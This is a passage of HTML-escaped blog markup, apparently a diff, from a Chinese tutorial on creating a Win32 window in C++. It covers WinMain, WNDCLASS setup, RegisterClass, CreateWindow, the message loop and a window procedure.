punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;PWNDCLASSEX&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;你的窗口是什么样式、 大小、是否有图标、 消息处理函数在哪里等等，需要我们给指定。&lt;br /&gt;
+还有一个 &lt;code&gt;WNDCLASS&lt;/code&gt;  结构，这个是兼容老版本的。如今一般用 &lt;code&gt;WNDCLASSEX&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;详细见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMjQzMDY1L2FydGljbGUvZGV0YWlscy84MzUxMzc5NQ==&#34;&gt; https://blog.csdn.net/qq_31243065/article/details/83513795&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;创建一个窗口程序的详细步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建一个窗口程序的详细步骤&#34;&gt;#&lt;/a&gt; 创建一个窗口程序的详细步骤&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;步骤 1：创建 Windows 应用程序 选择空项目&lt;br /&gt;
+步骤 2：在新建项窗口中选 C++ 代码文件 创建一个新的 cpp 文件&lt;br /&gt;
+步骤 3：在新的 cpp 文件中添加: &lt;code&gt;#include &amp;lt;Windows.h&amp;gt;&lt;/code&gt; &lt;br /&gt;
+ 并添加入口函数：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; CALLBACK &lt;span class=&#34;token function&#34;&gt;WinMain&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;                 &lt;span class=&#34;token comment&#34;&gt;// CALLBACK 是一个宏  #define CALLBACK __stdcall   所有的 Win32 API 函数都遵循该约定 此外 #define WINAPI __stdcall  #define APIENTRY    WINAPI        &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            _In_ HINSTANCE hInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            _In_ HINSTANCE hPrevInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            _In_ LPSTR lpCmdLine&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            _In_ &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; nCmdShow&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;步骤 4：设计窗口类&lt;br /&gt;
+既能用 &lt;code&gt;WNDCLASS&lt;/code&gt;  也能用 &lt;code&gt;WNDCLASSEX&lt;/code&gt; &lt;br /&gt;
+ 例：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 窗口的类名    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;TCHAR className&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;My First Window&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 创建窗口类的对象     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;WNDCLASS wndclass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 一定要先将所有值赋值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wndclass&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hbrBackground &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;HBRUSH&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;COLOR_MENU&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 窗口的背景色    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wndclass&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lpfnWndProc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; WindowProc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 窗口过程函数    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wndclass&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lpszClassName &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; className&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 窗口类的名字    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wndclass&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hInstance &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; hInstance&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 定义窗口类的应用程序的实例句柄&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;步骤 5：注册窗口类    (这是什么？哈哈哈，就是把结构体赋值后传参调用)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;RegisterClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;wndclass&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;步骤 6：创建窗口&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 创建窗口     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HWND hwnd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;CreateWindow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            className&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                    &lt;span class=&#34;token comment&#34;&gt;// 类名    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;TEXT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;我的第一个窗口&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 窗口标题    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            WS_OVERLAPPEDWINDOW&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;          &lt;span class=&#34;token comment&#34;&gt;// 窗口外观样式     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                           &lt;span class=&#34;token comment&#34;&gt;// 相对于父窗口的 X 坐标    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                           &lt;span class=&#34;token comment&#34;&gt;// 相对于父窗口的 Y 坐标    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token number&#34;&gt;600&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                          &lt;span class=&#34;token comment&#34;&gt;// 窗口的宽度     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token number&#34;&gt;300&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                          &lt;span class=&#34;token comment&#34;&gt;// 窗口的高度     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                         &lt;span class=&#34;token comment&#34;&gt;// 父窗口句柄，为 NULL     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                         &lt;span class=&#34;token comment&#34;&gt;// 菜单句柄，为 NULL     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            hInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                    &lt;span class=&#34;token comment&#34;&gt;// 当前应用程序的句柄     &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;                          &lt;span class=&#34;token comment&#34;&gt;// 附加数据一般为 NULL&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hwnd &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Error!!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 一般都会判断是否创建成功&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;步骤 7：显示窗口&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 显示窗口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ShowWindow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hwnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; SW_SHOW&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;步骤 8：消息循环&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;MSG msg&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;GetMessage&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;msg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;TranslateMessage&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;msg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 键盘消息转换为小写.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;DispatchMessage&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;msg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 分发消息。将我们的消息传递给我们的回调函数处理 重要函数。此消息会将 Windows 的消息。发送给我们 定义窗口类的时候给的回调函数。这样我们就可以根据消息执行我们代码了.    &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;步骤 9：回调函数&lt;br /&gt;
+例：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*                        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;窗口消息处理程序 窗口回调函数：            &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;1、窗口回调函数处理过的消息，必须传回 0.        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;2、窗口回调不处理的消息，由 DefWindowProc 来处理.    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//  函数: WndProc (HWND, UINT, WPARAM, LPARAM)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//  目的：处理主窗口的消息。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//  WM_COMMAND  - 处理应用程序菜单&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//  WM_PAINT    - 绘制主窗口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//  WM_DESTROY  - 发送退出消息并返回&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LRESULT CALLBACK &lt;span class=&#34;token function&#34;&gt;WindowProc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;         &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            IN HWND hwnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            IN UINT uMsg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            IN WPARAM wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            IN LPARAM lParam     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;uMsg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token comment&#34;&gt;// 窗口消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_COMMAND&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;                           &lt;span class=&#34;token comment&#34;&gt;// 菜单消息类型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; wmId &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;LOWORD&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;           &lt;span class=&#34;token comment&#34;&gt;// 取低两位为菜单 ID. 根据菜单 ID 可以进行操作我们的窗口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token comment&#34;&gt;// 